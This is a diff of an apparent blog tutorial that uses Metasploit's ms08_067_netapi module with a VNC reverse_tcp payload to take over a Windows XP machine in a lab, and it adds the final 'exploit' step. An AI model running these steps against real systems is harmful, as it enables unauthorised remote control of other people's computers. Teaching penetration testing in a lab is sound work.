@@ -21,9 +21,11 @@ In the dropdown menue to the right of the search field, choose "Metasploit Modue
 
 Look under "Moduel Name" and identify the code exploit/windows/smb/ms08_067_netapi. We will use this later
 
+<b>Loading Exploits and Payloads</b>
+[Offensive Security - Metasploit Commands][Metasploit-Commands]
+[Offensive Security - Using Exploits][Using-Exploits]
+
 Open terminal and type in the following command
-
-
 
 {% highlight ruby %}
 msfconsole
@@ -41,6 +43,8 @@ Next we will need to use a payload. A payload is basicly software that takes adv
 set PAYLOAD /windows/vncinject/reverse_tcp
 {% endhighlight %}
 
+<b>Setting Up The Attack</b>
+
 You will need to load a list of settings before running the command to hack the Windows XP computer. We can do this by typing
 
 {% highlight ruby %}
@@ -49,8 +53,9 @@ show options
 {% endhighlight %}
 
 You should get something like the image below
+https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
 
-IMAGE OF SHOW OPTIONS
+<img src"../images/ms08_067/msfconsole_show_options1.JPG>
 
 You may notice that a fiew of the fields are empty. RHOST and LHOST. RHOST is the remote host. The IP of the target computer. LHOST is the local host. Your computer.
 
@@ -62,7 +67,7 @@ ifconfig
 
 You should see something like this. I highlighted the IP in yellow.
 
-IMMAGE OF IFCONFIG
+<img src"../images/ms08_067/ifconfig.JPG>
 
 Type in the following, but replace the RHOST IP with the Windows IP you found earlier and LHOST of the Kali IP.
 
@@ -80,13 +85,25 @@ We have everything we need right? Just one more setting. This will allow us to c
 set ViewOnly false
 {% endhighlight %}
 
+<b>Hack It!</b>
+
 Now run show options again and you should have something like this.
 
-IMAGE OF SHOW OPTIONS
+<img src"../images/ms08_067/msfconsole_show_options2.JPG>
+
+Run the following command.
+
+{% highlight ruby %}
+exploit
+{% endhighlight %}
 
 Congradulations. You did it! You can now do whatever you like to the target computer.
 
+<img src"../images/ms08_067/owned.JPG>
 
 [Rapid7-DB]: https://www.rapid7.com/db
+[Using-Exploits]: https://www.offensive-security.com/metasploit-unleashed/exploits/
+[Metasploit-Commands]: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+
 
 
